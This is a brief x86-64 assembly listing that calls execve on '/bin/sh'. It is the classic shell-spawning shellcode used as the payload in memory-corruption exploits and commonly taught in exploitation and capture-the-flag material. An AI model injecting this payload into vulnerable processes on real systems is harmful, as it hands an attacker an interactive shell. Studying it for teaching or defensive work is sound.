.global _start
_start:
.intel_syntax noprefix
    xor rdx, rdx
    xor rsi, rsi
    lea rdi, [rip+binsh]
    mov rax, 59
    syscall
    binsh:
        .string "/bin/sh"
